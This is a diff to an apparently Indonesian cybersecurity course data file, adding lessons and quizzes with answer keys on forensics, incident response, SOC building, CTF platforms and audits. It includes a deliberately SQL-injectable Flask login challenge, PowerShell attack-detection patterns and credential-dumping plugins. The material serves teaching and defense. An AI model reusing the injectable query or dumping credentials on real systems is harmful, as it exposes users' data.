+# 5. Revert snapshot
+\`\`\`
+
+## Tools Populer
+
+\`\`\`text
+Static:
+- Ghidra / IDA Free   : disassembler & decompiler
+- pestudio            : PE analyzer
+- Detect It Easy      : packer detection
+- CAPA                : CAPABILITY detection
+
+Dynamic:
+- Cuckoo Sandbox      : automated analysis
+- Any.run / Joe Sandbox : cloud sandbox
+- Process Monitor     : Sysinternals
+- API Monitor         : API call tracing
+\`\`\`
+
+## Workflow Dasar
+
+\`\`\`text
+1. Pastikan sample aman diisolasi (offline VM)
+2. Hitung hash & cek di VirusTotal
+3. Static: file type, strings, imports, packer
+4. Dynamic: snapshot → run → capture → revert
+5. Network analysis: C2, DNS, exfil
+6. Dokumentasi IoC & TTP (MITRE ATT&CK)
+\`\`\`
+
+> JANGAN PERNAH menjalankan malware di host utama. Selalu gunakan VM isolated, snapshot bersih, dan jaringan terisolasi. Safety first — satu kesalahan bisa berarti rebuild sistem.`,
+    quiz: [
+      {
+        question: "Perbedaan static dan dynamic analysis?",
+        options: ["Static menjalankan, dynamic tidak", "Static tanpa eksekusi, dynamic menjalankan malware", "Sama", "Dynamic lebih lambat"],
+        answer: 1,
+        explanation: "Static analysis memeriksa file tanpa eksekusi, sementara dynamic analysis mengamati malware saat dijalankan di sandbox."
+      },
+      {
+        question: "Tool disassembler & decompiler open-source?",
+        options: ["Ghidra", "Photoshop", "Wireshark", "Burp Suite"],
+        answer: 0,
+        explanation: "Ghidra adalah reverse engineering tool open-source dari NSA yang populer untuk static analysis malware."
+      },
+      {
+        question: "Aplikasi untuk sandbox otomatis analisis malware?",
+        options: ["Cuckoo Sandbox", "Microsoft Word", "Excel", "Slack"],
+        answer: 0,
+        explanation: "Cuckoo Sandbox adalah framework open-source untuk analisis malware otomatis dalam environment terisolasi."
+      }
+    ]
+  },
+  {
+    level: 6,
+    order: 4,
+    title: "Digital Forensics",
+    slug: "digital-forensics",
+    description: "Investigasi bukti digital setelah insiden keamanan.",
+    icon: "🔎",
+    isProject: false,
+    content: `# Digital Forensics
+
+**Digital Forensics** adalah proses pengumpulan, pelestarian, analisis, dan presentasi bukti digital untuk investigasi insiden atau keperluan hukum. Forensik menjawab pertanyaan: apa yang terjadi, kapan, oleh siapa, dan dampaknya.
+
+## Prinsip Utama
+
+\`\`\`text
+1. Jangan ubah bukti asli (kerja di image/copy)
+2. Dokumentasi chain of custody (rantai perawatan)
+3. Rekam hash setiap tahap (integrity)
+4. Forensically sound tools (read-only access)
+5. Reproducible methodology
+\`\`\`
+
+## Akuisisi Bukti
+
+\`\`\`bash
+# Image disk dengan dd (hash sebelum & sesudah)
+sha256sum /dev/sdb
+dd if=/dev/sdb of=disk.img bs=4M conv=sync,noerror
+sha256sum disk.img
+# Hash harus cocok → bukti tidak berubah
+
+# Akuisisi RAM (live forensics)
+./LiME.ko "path=/ram.lime format=lime"
+
+# Tools khusus
+dc3dd, dcfldd, FTK Imager, Guymager
+\`\`\`
+
+## Analisis Disk
+
+\`\`\`bash
+# Autopsy - GUI forensic platform
+autopsy &
+
+# Sleuth Kit CLI
+fls disk.img               # list files
+icat disk.img <inode>      # extract file
+ils disk.img               # list deleted inodes
+mmls disk.img              # partition table
+\`\`\`
+
+## Artefak Penting
+
+\`\`\`text
+Windows:
+- $MFT           (Master File Table)
+- Registry hives (SAM, SYSTEM, SOFTWARE)
+- Event logs     (Security.evtx)
+- Prefetch       (.pf)
+- Browser history
+- Recycle Bin    ($I, $R files)
+
+Linux:
+- /var/log/*     (syslog, auth.log)
+- ~/.bash_history
+- /etc/passwd, /etc/shadow
+- crontab, systemd timers
+\`\`\`
+
+## Timeline Analysis
+
+\`\`\`bash
+# Bodyfile & mactime (Sleuth Kit)
+fls -m / disk.img > bodyfile
+mactime -b bodyfile > timeline.csv
+
+# Plaso/log2timeline (advanced)
+log2timeline.py timeline.plaso disk.img
+psort.py -o l2tcsv timeline.plaso > output.csv
+\`\`\`
+
+> Forensik digital bukan hanya teknis — rantai perawatan dan dokumentasi menentukan bukti dapat diterima di pengadilan. Satu kesalahan prosedural bisa membatalkan seluruh investigasi.`,
+    quiz: [
+      {
+        question: "Prinsip paling penting dalam forensik digital?",
+        options: ["Cepat selesai", "Jangan ubah bukti asli", "Bagikan bukti", "Pakai tools terbaru"],
+        answer: 1,
+        explanation: "Forensik digital harus menjaga integritas bukti asli — kerja pada image/copy, bukan device aslinya."
+      },
+      {
+        question: "Tool open-source untuk image disk & hash?",
+        options: ["dd + sha256sum", "Photoshop", "Microsoft Word", "Excel"],
+        answer: 0,
+        explanation: "dd untuk membuat image disk, sha256sum untuk verifikasi integritas — kombinasi forensik standar."
+      },
+      {
+        question: "Platform forensik GUI open-source populer?",
+        options: ["Autopsy", "Nessus", "Burp Suite", "Metasploit"],
+        answer: 0,
+        explanation: "Autopsy adalah platform forensik GUI open-source yang dibangun di atas The Sleuth Kit."
+      }
+    ]
+  },
+  {
+    level: 6,
+    order: 5,
+    title: "Memory Forensics",
+    slug: "memory-forensics",
+    description: "Analisis RAM untuk mendeteksi malware dan aktivitas mencurigakan.",
+    icon: "💾",
+    isProject: false,
+    content: `# Memory Forensics
+
+**Memory Forensics** adalah analisis dump RAM untuk mendeteksi malware fileless, rootkit, proses tersembunyi, dan aktivitas berbahaya yang tidak meninggalkan jejak di disk. Sangat penting untuk malware modern yang hanya hidup di memory.
+
+## Kapan Memory Forensics Penting?
+
+\`\`\`text
+- Malware fileless (PowerShell, .NET in-memory)
+- Rootkit kernel yang menyembunyikan proses
+- Insiden dengan enkripsi disk (bitlocker aktif)
+- Live response sebelum shutdown
+- Mendapatkan kredensial yang masih di cache
+\`\`\`
+
+## Volatility Framework
+
+\`\`\`bash
+# Identifikasi profil OS
+volatility -f memory.dmp imageinfo
+
+# Pslist - daftar proses
+volatility -f memory.dmp --profile=Win10x64 pslist
+
+# PSTree - tree view
+volatility -f memory.dmp --profile=Win10x64 pstree
+
+# Deteksi proses disembunyikan
+volatility -f memory.dmp --profile=Win10x64 psxview
+
+# Koneksi network
+volatility -f memory.dmp --profile=Win10x64 netscan
+
+# Malfind - injeksi kode
+volatility -f memory.dmp --profile=Win10x64 malfind
+\`\`\`
+
+## Plugin Penting
+
+\`\`\`text
+pslist       : daftar proses (EPROCESS)
+psscan       : scan pool tag untuk proses tersembunyi
+psxview      : cross-view untuk detect rootkit hide
+netscan      : koneksi network
+cmdline      : command line tiap proses
+dlllist      : DLL loaded
+handles      : file & key handle
+malfind      : detect code injection
+hashdump     : dump NTLM hash
+lsadump      : LSA secrets
+\`\`\`
+
+## Hunting Workflow
+
+\`\`\`bash
+# Otomatis dengan Volatility 3
+vol3 -f memory.dmp windows.pslist
+vol3 -f memory.dmp windows.netscan
+vol3 -f memory.dmp windows.malfind
+
+# Dump proses mencurigakan
+volatility -f memory.dmp --profile=Win10x64 procdump -p 1234 -D ./dump/
+\`\`\`
+
+\`\`\`text
+Indikator malicious:
+- Proses dengan parent tidak biasa
+- Proses system dijalankan dari path aneh
+- Malfind menemukan RWX memory
+- Koneksi ke IP mencurigakan
+- Proses tanpa executable di disk
+\`\`\`
+
+> Memory forensics adalah senjata utama melawan malware fileless. Tanpa analisis RAM, banyak serangan modern tidak akan terdeteksi sama sekali.`,
+    quiz: [
+      {
+        question: "Framework memory forensics paling populer?",
+        options: ["Volatility", "Burp Suite", "Metasploit", "Nessus"],
+        answer: 0,
+        explanation: "Volatility adalah framework open-source paling populer untuk analisis memory dump."
+      },
+      {
+        question: "Kapan memory forensics sangat penting?",
+        options: ["Untuk backup file", "Deteksi malware fileless", "Enkripsi disk", "Update OS"],
+        answer: 1,
+        explanation: "Malware fileless hanya hidup di RAM, sehingga hanya bisa dideteksi dengan memory forensics."
+      },
+      {
+        question: "Plugin Volatility untuk deteksi proses tersembunyi?",
+        options: ["pslist", "psxview", "hashdump", "netscan"],
+        answer: 1,
+        explanation: "psxview menggunakan cross-view antar berbagai sumber untuk mendeteksi proses yang disembunyikan rootkit."
+      }
+    ]
+  },
+  {
+    level: 6,
+    order: 6,
+    title: "Incident Response",
+    slug: "incident-response",
+    description: "Prosedur menanggapi insiden keamanan siber.",
+    icon: "🚨",
+    isProject: false,
+    content: `# Incident Response
+
+**Incident Response (IR)** adalah proses terstruktur untuk mendeteksi, menahan, dan memulihkan dari insiden keamanan siber. Tujuannya meminimalkan dampak dan mencegah kejadian berulang.
+
+## Siklus NIST IR (PICERL)
+
+\`\`\`text
+1. Preparation         (siap sebelum insiden)
+2. Identification      (deteksi & validasi)
+3. Containment         (isolasi penyebaran)
+4. Eradication         (hapus ancaman)
+5. Recovery            (restore service)
+6. Lessons Learned     (post-mortem)
+\`\`\`
+
+## Preparation
+
+\`\`\`text
+- IR Policy & Playbook
+- IR Team & kontak 24/7
+- Tools: EDR, SIEM, forensic kit
+- Komunikasi: internal, media, regulator
+- Tabletop exercise rutin
+\`\`\`
+
+## Identification
+
+\`\`\`bash
+# Sumber deteksi
+- SIEM alert (Splunk, ELK)
+- EDR alert (CrowdStrike, SentinelOne)
+- User report (phishing button)
+- Threat intel feed
+- DNS anomalies
+
+# Validasi: true positive atau false positive?
+\`\`\`
+
+## Containment
+
+\`\`\`bash
+# Short-term: isolasi host
+# Disable network interface
+ip link set eth0 down
+
+# atau via EDR
+edr-cli isolate --host COMP-001
+
+# Long-term: reset kredensial, block IP/domain
+\`\`\`
+
+## Eradication & Recovery
+
+\`\`\`text
+Eradication:
+- Hapus backdoor & persistence
+- Reset semua kredensial terkompromi
+- Patch kerentanan yang dieksploitasi
+- Reimage host terinfeksi (jangan repair)
+
+Recovery:
+- Restore dari backup bersih
+- Validasi integritas (hash compare)
+- Monitor ketat fase "hyper-care"
+- Phased rollout service
+\`\`\`
+
+## Lessons Learned
+
+\`\`\`text
+Dokumen post-mortem:
+- Timeline insiden lengkap
+- Root cause analysis (RCA)
+- Gap yang ditemukan (people/process/tech)
+- Rekomendasi perbaikan
+- Update playbook & deteksi rule
+\`\`\`
+
+> Kecepatan containment menentukan skala damage. Rata-rata dwell time penyerang 21 hari — semakin cepat kita mendeteksi dan mengisolasi, semakin kecil kerugian bisnis.`,
+    quiz: [
+      {
+        question: "Apa kepanjangan PICERL dalam IR?",
+        options: ["Preparation, Identification, Containment, Eradication, Recovery, Lessons", "Process, Implement, Control, Execute, Run, Log", "Pentest, Investigate, Contain, Eradicate, Report, Learn", "Phishing, ID, Content, Email, Root, Log"],
+        answer: 0,
+        explanation: "PICERL adalah akronim siklus Incident Response NIST: Preparation, Identification, Containment, Eradication, Recovery, Lessons Learned."
+      },
+      {
+        question: "Tahap pertama setelah mendeteksi insiden?",
+        options: ["Eradication", "Containment", "Recovery", "Lessons Learned"],
+        answer: 1,
+        explanation: "Setelah insiden teridentifikasi, containment (isolasi) adalah prioritas utama untuk mencegah penyebaran."
+      },
+      {
+        question: "Apa yang dilakukan di fase Lessons Learned?",
+        options: ["Reset password", "Post-mortem & perbaiki gap", "Restore backup", "Isolasi host"],
+        answer: 1,
+        explanation: "Lessons Learned adalah fase post-mortem: menganalisis root cause, mendokumentasikan gap, dan memperbaiki playbook."
+      }
+    ]
+  },
+  {
+    level: 6,
+    order: 7,
+    title: "Project: Malware Analysis",
+    slug: "project-malware-analysis",
+    description: "Proyek menganalisis sample malware secara lengkap.",
+    icon: "🧪",
+    isProject: true,
+    content: `# Project: Malware Analysis
+
+Pada proyek akhir Level 6, Anda akan melakukan **analisis malware end-to-end** terhadap sampel (dari repo akademik seperti MalwareBazaar atau theZoo) dan menghasilkan laporan analisis profesional.
+
+## Persiapan Lab
+
+\`\`\`bash
+# REMnux (Linux analysis) - VM isolated
+# https://remnux.org
+
+# FLARE-VM (Windows analysis) - VM isolated
+# https://github.com/mandiant/flare-vm
+
+# Penting:
+# - VM SNAPSHOTTED, no shared folders with host
+# - Network isolated / fake internet (INetSim)
+# - No production credentials on the lab
+\`\`\`
+
+## Tahapan Analisis
+
+### 1. Triage & Static Awal
+
+\`\`\`bash
+# Hash & identifikasi
+sha256sum sample.bin
+file sample.bin
+# Submit hash ke VirusTotal (JIKA boleh expose)
+
+# Strings & import
+strings -n 8 sample.bin > strings.txt
+pestudio sample.bin
+\`\`\`
+
+### 2. Dynamic Analysis
+
+\`\`\`bash
+# Setup monitoring di Windows VM
+# - Procmon, Process Hacker, Regshot
+# - Wireshark dengan fake-net
+# - INetSim untuk simulasi internet
+
+# Eksekusi & observe
+# - Proses yang spawn
+# - Perubahan registry
+# - Network C2 traffic
+# - File dropped
+\`\`\`
+
+### 3. Static Analysis Lanjut
+
+\`\`\`bash
+# Buka di Ghidra
+# - Identify entry point
+# - Decompile main function
+# - Cari string, API call penting
+# - Packer? (DIE / Detect It Easy)
+
+# CAPA untuk capability identification
+capa sample.bin
+\`\`\`
+
+### 4. Behavior & IoC Extraction
+
+\`\`\`text
+Identifikasi:
+- C2 server (domain/IP)
+- Persistence mechanism
+- Lateral movement technique
+- Exfiltration method
+- MITRE ATT&CK TTP mapping
+\`\`\`
+
+## Struktur Laporan
+
+\`\`\`text
+1. Executive Summary
+2. Sample Information (hash, size, type)
+3. Static Analysis Findings
+4. Dynamic Analysis Findings
+5. Network Analysis (C2, protocol)
+6. Code Analysis (key functions)
+7. MITRE ATT&CK mapping
+8. Indicators of Compromise (IoC)
+9. Detection & Mitigation Recommendations
+10. Appendix (screenshots, decompilation)
+\`\`\`
+
+## Deliverables
+
+\`\`\`text
+- PDF laporan analisis (15-25 halaman)
+- File IoC (STIX/CSV format)
+- YARA rule untuk deteksi
+- Video walkthrough analisis (10-15 menit)
+- Snapshot VM dengan tools siap pakai
+\`\`\`
+
+\`\`\`yara
+rule TrojanSample_MalwareProj {
+  meta:
+    description = "Deteksi trojan dari proyek analisis"
+    author      = "Your Name"
+    date        = "2025-01-01"
+  strings:
+    $s1 = "C2_URL_PLACEHOLDER" wide ascii
+    $s2 = { 4D 5A 90 00 03 00 00 00 }
+    $api1 = "InternetOpenA" ascii
+  condition:
+    uint16(0) == 0x5A4D and 2 of ($s*, $api*)
+}
+\`\`\`
+
+> Malware analysis yang baik bukan hanya "menemukan string jahat". Pahami intent, TTP, dan jadikan temuan actionable: IoC, YARA rule, dan rekomendasi deteksi yang bisa langsung dipakai SOC.`,
+    quiz: [
+      {
+        question: "OS yang populer untuk lab analisis malware Linux?",
+        options: ["REMnux", "Ubuntu Desktop", "Kali default", "Windows 11"],
+        answer: 0,
+        explanation: "REMnux adalah distro Linux yang sudah dilengkapi tools analisis malware reverse engineering."
+      },
+      {
+        question: "Hal terpenting saat setup lab malware?",
+        options: ["Internet cepat", "Isolasi jaringan & snapshot VM", "RAM besar", "GPU kencang"],
+        answer: 1,
+        explanation: "Lab malware harus terisolasi dari network produksi dan memiliki snapshot untuk revert — keselamatan prioritas utama."
+      },
+      {
+        question: "Format standar untuk berbagi IoC antar tools?",
+        options: ["PDF", "STIX", "PNG", "DOCX"],
+        answer: 1,
+        explanation: "STIX (Structured Threat Information Expression) adalah standar pertukaran threat intelligence termasuk IoC."
+      }
+    ]
+  },
+
+  // ==================== LEVEL 7 - PROJECT AKHIR (6, all isProject:true) ====================
+  {
+    level: 7,
+    order: 1,
+    title: "Build a SOC",
+    slug: "project-build-soc",
+    description: "Membangun Security Operations Center sederhana.",
+    icon: "🏛️",
+    isProject: true,
+    content: `# Build a SOC
+
+Pada proyek ini Anda akan membangun **Security Operations Center (SOC) sederhana** yang mampu mengumpulkan log, mendeteksi ancaman, dan memberi alert. SOC adalah jantung pertahanan organisasi modern.
+
+## Komponen SOC
+
+\`\`\`text
+1. SIEM      - Splunk / ELK / Wazuh (log aggregation & correlation)
+2. EDR       - endpoint detection (Wazuh agent, OSSEC)
+3. IDS/IPS   - Suricata / Zeek (network)
+4. Threat Intel - MISP (IoC sharing)
+5. SOAR      - automasi response (Shuffle, Phantom)
+6. IR Playbook - dokumentasi runbook
+\`\`\`
+
+## Arsitektur Minimal dengan Wazuh
+
+\`\`\`bash
+# Install Wazuh (All-in-one untuk lab)
+curl -sO https://packages.wazuh.com/4.x/wazuh-install.sh
+bash wazuh-install.sh --all-in-one
+
+# Deploy agent di endpoint
+WAZUH_MANAGER="10.0.0.10" apt install wazuh-agent
+
+# Integrasi Suricata di sensor network
+suricata -i eth0 --set outputs.1.eve-log.filename=/var/log/suricata/eve.json
+# Kirim eve.json ke Wazuh via Filebeat
+\`\`\`
+
+## Use Case Detection
+
+\`\`\`text
+USE-CASE 1: Brute Force SSH
+  - Filter: sshd "Failed password"
+  - Threshold: >5 failed / 5 menit / IP
+  - Action: alert + ban via firewall
+
+USE-CASE 2: Suspicious PowerShell
+  - Filter: process: powershell.exe
+  - Pattern: -enc, DownloadString, Invoke-Mimikatz
+  - Action: high severity alert
+
+USE-CASE 3: C2 Beaconing
+  - Filter: outbound connection periodic
+  - Pattern: same IP, interval teratur
+  - Action: investigate + block
+\`\`\`
+
+## Dashboard & KPI
+
+\`\`\`bash
+# Visualisasi di Kibana/Grafana
+- Events per minute
+- Top source IP
+- Alert by severity
+- MITRE ATT&CK heatmap
+- Mean time to detect (MTTD)
+- Mean time to respond (MTTR)
+\`\`\`
+
+## Deliverables
+
+\`\`\`text
+1. Diagram arsitektur SOC
+2. Dashboard SIEM yang berfungsi
+3. Minimal 5 use case detection (rule + alert)
+4. IR Playbook untuk 3 skenario umum
+5. Dokumentasi deployment
+6. Demo video deteksi insiden
+\`\`\`
+
+> SOC bukan tentang tools, tapi tentang people + process + technology. Tools terbaik tanpa analyst terlatih dan playbook jelas hanya menghasilkan alert fatigue.`,
+    quiz: [
+      {
+        question: "Apa fungsi SIEM dalam SOC?",
+        options: ["Backup data", "Agregasi & korelasi log untuk deteksi", "Antivirus", "Web server"],
+        answer: 1,
+        explanation: "SIEM (Security Information & Event Management) mengumpulkan, mengkorelasikan log dan mendeteksi ancaman."
+      },
+      {
+        question: "Platform SOC open-source populer?",
+        options: ["Wazuh", "Microsoft Office", "Photoshop", "Excel"],
+        answer: 0,
+        explanation: "Wazuh adalah platform SIEM + EDR open-source yang banyak digunakan untuk membangun SOC."
+      },
+      {
+        question: "KPI untuk mengukur kecepatan deteksi SOC?",
+        options: ["MTTD", "CPU usage", "RAM", "Disk space"],
+        answer: 0,
+        explanation: "MTTD (Mean Time To Detect) mengukur rata-rata waktu dari terjadinya insiden hingga terdeteksi SOC."
+      }
+    ]
+  },
+  {
+    level: 7,
+    order: 2,
+    title: "CTF Platform",
+    slug: "project-ctf-platform",
+    description: "Membuat platform Capture The Flag sendiri.",
+    icon: "🏁",
+    isProject: true,
+    content: `# CTF Platform
+
+Pada proyek ini Anda akan membangun **platform Capture The Flag (CTF)** sendiri — sistem yang dapat menyajikan tantangan keamanan, menerima submission flag, dan menampilkan scoreboard. CTF adalah cara terbaik untuk melatih skill keamanan secara praktis.
+
+## Komponen Platform
+
+\`\`\`text
+1. Web App      - tampilkan tantangan & submit flag
+2. Database     - simpan user, tantangan, submission
+3. Scoreboard   - ranking real-time
+4. Challenge VM - kontainer tantangan (Docker)
+5. Auth         - registrasi & login tim
+6. Admin Panel  - manajemen tantangan
+\`\`\`
+
+## Tech Stack Saran
+
+\`\`\`bash
+# Backend: Node.js + Express / Python + Flask
+# Frontend: React / Next.js
+# Database: PostgreSQL / MongoDB
+# Container: Docker + Docker Compose
+
+# CTFd - framework siap pakai
+docker run -p 8000:8000 ctfd/ctfd
+\`\`\`
+
+## Arsitektur Tantangan
+
+\`\`\`yaml
+# docker-compose.yml untuk challenge
+version: "3"
+services:
+  web-sqli:
+    build: ./challenges/sqli
+    ports:
+      - "5001:80"
+    environment:
+      - FLAG=FLAG{sqli_1s_fun_12345}
+
+  rev-binary:
+    build: ./challenges/rev
+    ports:
+      - "5002:9999"
+\`\`\`
+
+## Kategori Tantangan
+
+\`\`\`text
+1. Web          - SQLi, XSS, IDOR, auth bypass
+2. Pwn          - buffer overflow, ROP, format string
+3. Reverse      - analisis binary, crackme
+4. Crypto       - Caesar, RSA, AES misuse
+5. Forensics    - pcap, steganography, memory dump
+6. Misc         - logika, OSINT, scripting
+\`\`\`
+
+## Contoh Challenge Sederhana
+
+\`\`\`python
+# Challenge SQLi (Flask)
+from flask import Flask, request, render_template_string
+import sqlite3
+
+app = Flask(__name__)
+
+@app.route("/login", methods=["GET","POST"])
+def login():
+    user = request.form.get("user","")
+    passw = request.form.get("pass","")
+    # INTENTIONALLY VULNERABLE
+    q = f"SELECT * FROM users WHERE user='{user}' AND pass='{passw}'"
+    cur = sqlite3.connect("db.sqlite").cursor()
+    cur.execute(q)
+    if cur.fetchone():
+        return "FLAG{sqli_master_2025}"
+    return "Login failed", 401
+\`\`\`
+
+## Deliverables
+
+\`\`\`text
+1. Platform CTF berjalan (web + scoreboard)
+2. Minimal 10 tantangan di 4 kategori
+3. Docker compose untuk setup satu perintah
+4. Writeup solusi tiap tantangan
+5. Dokumentasi admin
+6. Demo event dengan minimal 3 tim
+\`\`\`
+
+> Membangun CTF bukan hanya coding — desain tantangan yang edukatif (tidak frustasi tapi tidak trivial) adalah seni tersendiri. Sertakan hint bertingkat untuk kelancaran pengalaman belajar peserta.`,
+    quiz: [
+      {
+        question: "Framework CTF siap pakai yang populer?",
+        options: ["CTFd", "WordPress", "Magento", "Drupal"],
+        answer: 0,
+        explanation: "CTFd adalah framework CTF open-source paling populer untuk menyelenggarakan kompetisi CTF."
+      },
+      {
+        question: "Kategori tantangan CTF untuk analisis binary?",
+        options: ["Web", "Reverse Engineering", "Crypto", "OSINT"],
+        answer: 1,
+        explanation: "Reverse Engineering adalah kategori CTF yang berfokus pada analisis binary/executable untuk memahami cara kerjanya."
+      },
+      {
+        question: "Format flag yang umum di CTF?",
+        options: ["FLAG{text}", "password123", "admin", "root"],
+        answer: 0,
+        explanation: "Format flag umumnya berupa FLAG{...} atau picoCTF{...} yang menjadi tujuan peserta menyelesaikan tantangan."
       }
     ]
   },
   {
     level: 7,
     order: 3,
-    title: "Sistem Login",
-    slug: "project-sistem-login-full",
-    description: "Bangun sistem autentikasi lengkap dengan registrasi, login, OAuth, role, dan keamanan.",
-    icon: "🔐",
+    title: "Security Audit",
+    slug: "project-security-audit",
+    description: "Melakukan audit keamanan lengkap pada sebuah organisasi.",
+    icon: "📋",
     isProject: true,
-    content: `# Project: Sistem Login Full-Stack
+    content: `# Security Audit
 
-**Sistem Login Full-Stack** adalah project yang fokus pada autentikasi yang aman dan lengkap. Lebih komprehensif dari project Level 6—kali ini dengan frontend, OAuth, role management, dan fitur keamanan advanced.
+Pada proyek ini Anda akan melakukan **audit keamanan menyeluruh** pada sebuah organisasi (nyata atau simulasi). Audit berbeda dari pentest — fokus pada kepatuhan (compliance), kebijakan, dan postur keamanan keseluruhan, bukan eksploitasi teknis semata.
 
-## Fitur Utama
+## Lingkup Audit
 
-### Autentikasi
-- **Register** dengan email verification
-- **Login** dengan email/password
-- **OAuth login** (Google, GitHub)
-- **Forgot password** via email
-- **Reset password** dengan token
-- **Refresh token** mechanism
-- **Logout** dengan token blacklist
-- **Remember me** (extended session)
-
-### Manajemen User
-- **Profile page** (update nama, foto, bio)
-- **Change password**
-- **Upload avatar**
-- **Delete account**
-- **Session management** (lihat device aktif)
-
-### Role & Permission
-- **Role-based access control** (user, admin, superadmin)
-- **Permission middleware**
-- **Admin dashboard** (kelola user)
-- **Ban/suspend user**
-
-### Keamanan
-- **Rate limiting** di endpoint login
-- **Brute force protection**
-- **2FA** (Two-Factor Authentication) dengan TOTP
-- **Account lockout** setelah gagal login
-- **Secure HTTP headers** (helmet)
-- **CSRF protection**
-- **XSS prevention**
-
-## Tech Stack
-
-### Frontend
-- **Next.js** atau React
-- **Tailwind CSS**
-- **React Hook Form** untuk form
-- **Zod** untuk validasi
-
-### Backend
-- **Node.js + Express**
-- **Mongoose** (MongoDB)
-- **bcrypt** (hash password)
-- **jsonwebtoken** (JWT)
-- **passport** (OAuth)
-- **nodemailer** (email)
-- **speakeasy** (2FA TOTP)
-- **helmet**, **express-rate-limit** (security)
-- **redis** (token blacklist, opsional)
-
-## Database Schema
-
-\`\`\`javascript
-const userSchema = new Schema({
-  nama: String,
-  email: { type: String, unique: true },
-  password: String,           // null jika OAuth only
-  avatar: String,
-  role: { type: String, enum: ["user", "admin", "superadmin"], default: "user" },
-  isEmailVerified: { type: Boolean, default: false },
-  emailVerifyToken: String,
-  resetPasswordToken: String,
-  resetPasswordExpire: Date,
-  twoFactorSecret: String,
-  twoFactorEnabled: { type: Boolean, default: false },
-  loginAttempts: { type: Number, default: 0 },
-  lockUntil: Date,
-  provider: { type: String, enum: ["local", "google", "github"] },
-  providerId: String,
-  lastLogin: Date,
-  createdAt: Date
-});
+\`\`\`text
+1. Governance      - kebijakan, prosedur, RACI
+2. Risk Management - risk register, treatment
+3. Access Control  - IAM, RBAC, MFA, password policy
+4. Network         - firewall, segmentation, VPN
+5. Endpoint        - hardening, EDR, patching
+6. Data Protection - klasifikasi, enkripsi, DLP
+7. Operations      - logging, monitoring, backup
+8. Incident Response - playbook, latihan
+9. Compliance      - ISO 27001, SOC 2, PCI-DSS
+10. Human Factor   - security awareness, training
 \`\`\`
 
-## Arsitektur Sistem
+## Framework Acuan
 
-\`\`\`
-┌─────────────┐     ┌──────────────┐     ┌────────────┐
-│  Frontend   │────▶│  Backend API │────▶│ MongoDB    │
-│  (Next.js)  │◀────│  (Express)   │◀────│            │
-└─────────────┘     └──────┬───────┘     └────────────┘
-                           │
-                           ├────▶ Email Service (Nodemailer)
-                           ├────▶ Redis (token blacklist)
-                           └────▶ OAuth Provider (Google/GitHub)
-\`\`\`
+\`\`\`bash
+# ISO 27001/27002 - ISMS
+# NIST CSF       - Identify/Protect/Detect/Respond/Recover
+# CIS Controls v8 - 18 control areas
+# SOC 2          - Trust Service Principles
+# PCI-DSS        - kartu kredit
 
-## Langkah Implementasi
-
-### 1. Setup Project (1 hari)
-- Buat struktur monorepo (frontend + backend)
-- Setup environment variables (.env)
-- Konfigurasi MongoDB Atlas dan Redis
-
-### 2. Backend Auth Core (3-4 hari)
-- User model dengan hash password
-- Register endpoint dengan email verification
-- Login endpoint dengan rate limiting
-- JWT access + refresh token
-- Logout dengan blacklist token di Redis
-- Forgot/reset password flow
-
-### 3. OAuth Integration (2 hari)
-\`\`\`javascript
-// Google OAuth dengan Passport
-const GoogleStrategy = require("passport-google-oauth20").Strategy;
-
-passport.use(new GoogleStrategy({
-  clientID: process.env.GOOGLE_CLIENT_ID,
-  clientSecret: process.env.GOOGLE_CLIENT_SECRET,
-  callbackURL: "/auth/google/callback"
-}, async (accessToken, refreshToken, profile, done) => {
-  // Cari atau buat user berdasarkan Google ID
-  let user = await User.findOne({ providerId: profile.id, provider: "google" });
-  if (!user) {
-    user = await User.create({
-      nama: profile.displayName,
-      email: profile.emails[0].value,
-      provider: "google",
-      providerId: profile.id,
-      isEmailVerified: true
-    });
-  }
-  done(null, user);
-}));
+# Audit framework checklists
+# https://www.cisecurity.org/controls
 \`\`\`
 
-### 4. Frontend Auth Pages (3-4 hari)
-- Login page dengan form + tombol OAuth
-- Register page dengan validasi
-- Forgot password page
-- Reset password page
-- 2FA setup page (QR code)
-- Profile page
+## Metodologi Audit
 
-### 5. Role & Permission (2 hari)
-- Middleware checkRole(["admin", "superadmin"])
-- Admin dashboard (list user, ban, change role)
-- Protected admin routes
-
-### 6. Security Hardening (2 hari)
-- Implementasi rate limiting
-- Account lockout setelah 5x gagal
-- 2FA dengan TOTP (Google Authenticator)
-- Security headers dengan helmet
-- Audit logging
-
-### 7. Testing & Deployment (2 hari)
-- Unit test untuk auth logic
-- Integration test untuk flow lengkap
-- Deploy ke production (Vercel + Railway + Atlas)
-
-## Tantangan Lanjutan
-
-- **Magic link login** (login via email tanpa password)
-- **Biometric auth** (WebAuthn)
-- **Session management** dengan device tracking
-- **Audit log** untuk semua aksi user
-- **Single Sign-On (SSO)** untuk multiple apps
-
-## Contoh: Refresh Token Flow
-
-\`\`\`javascript
-// Saat login, kirim access token (15 menit) + refresh token (7 hari)
-// Access token expired → frontend kirim refresh token → backend beri access token baru
-
-app.post("/api/auth/refresh", async (req, res) => {
-  const refreshToken = req.body.refreshToken;
-  
-  // Cek apakah token di-blacklist
-  const blacklisted = await redis.get(\`blacklist:\${refreshToken}\`);
-  if (blacklisted) return res.status(401).json({ error: "Token invalid" });
-  
-  try {
-    const decoded = jwt.verify(refreshToken, process.env.REFRESH_SECRET);
-    const accessToken = jwt.sign({ id: decoded.id }, process.env.JWT_SECRET, { expiresIn: "15m" });
-    res.json({ accessToken });
-  } catch {
-    res.status(401).json({ error: "Refresh token invalid" });
-  }
-});
+\`\`\`text
+1. Kick-off meeting & scope definition
+2. Document review (policies, procedures)
+3. Interview stakeholders (IT, HR, finance)
+4. Technical assessment (scan, configuration)
+5. Observation (physical, operational)
+6. Sampling & testing (controls effectiveness)
+7. Gap analysis vs framework
+8. Risk rating (likelihood × impact)
+9. Report draft & validation
+10. Final report + remediation roadmap
 \`\`\`
 
-> **Best Practice:** Gunakan HTTPS di production, simpan JWT di httpOnly cookie (bukan localStorage) untuk hindari XSS, dan selalu hash password dengan bcrypt.`,
+## Contoh Finding Audit
+
+\`\`\`text
+AUDIT-FINDING-001: Tidak ada MFA pada akun admin
+
+Control Area   : Access Control (CIS 6.3)
+Severity       : High
+Description    : Administrator SaaS critical (GCP, GitHub)
+                 tidak mengaktifkan MFA. Berdasar interview
+                 dengan tim DevOps tanggal 10/01.
+Evidence       : Screenshot setting account + interview log
+Risk           : Kompromi kredensial → akses penuh infra
+Recommendation : Wajibkan MFA (TOTP/Hardware key) untuk
+                 semua akun privilege, audit quarterly.
+Owner          : Head of IT
+Due Date       : 2025-03-01
+\`\`\`
+
+## Maturity Scoring
+
